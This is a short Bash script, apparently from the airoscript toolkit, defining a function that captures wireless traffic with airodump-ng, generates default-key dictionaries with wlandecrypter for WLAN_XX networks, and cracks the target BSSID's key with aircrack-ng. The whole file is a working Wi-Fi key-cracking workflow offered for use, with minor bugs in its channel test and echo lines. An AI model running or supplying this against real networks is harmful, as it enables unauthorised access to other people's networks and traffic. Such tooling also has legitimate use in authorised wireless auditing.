#!/bin/bash
# Unstable functions file for airoscript.
# Requires: wlandecrypter 
# By David Francos (XayOn) <yo.orco@gmail.com>
echo -e "
\tUnstable functions from airoscript loaded,\n\tif you don't want this, set UNSTABLE=0 in\n\tconfig file"

function wld {

	CAPFILE=`mktemp -p $DUMP_PATH`
	DICFILE=`mktemp -p $DUMP_PATH` 
	
	echo -e "##################################\n##"
	echo -e "Do you want to specify a channel? \n##"
	echo -e "If so, enter the channel, if not, \n##"
	echo -e "leave it empty and press enter.   \n##"
	echo -e "##################################\n"


	read CHANNEL
	if [ $CHANNEL -ne "" ]
	then
		OPT="--channel "
	fi

	clear && airodump-ng -w $CAPFILE  $OPT $CHANNEL $WIFI && clear 
	
	echo  "\n#############################"
	echo  "## Enter target kind of wlan ##"
	echo  "## Supported targets:        ##"
	echo  "## WLAN_XX		    ##"
	echo  "###############################"
	echo  "Target: "
	read WLAN_KIND
	echo -e "Enter target BSSID:\n## "
	read BSSID && clear
	
	wlandecrypter $BSSID $WLAN_KIND $DICFILE && clear && aircrack-ng -b $BSSID -w $DICFILE $CAPFILE 
}
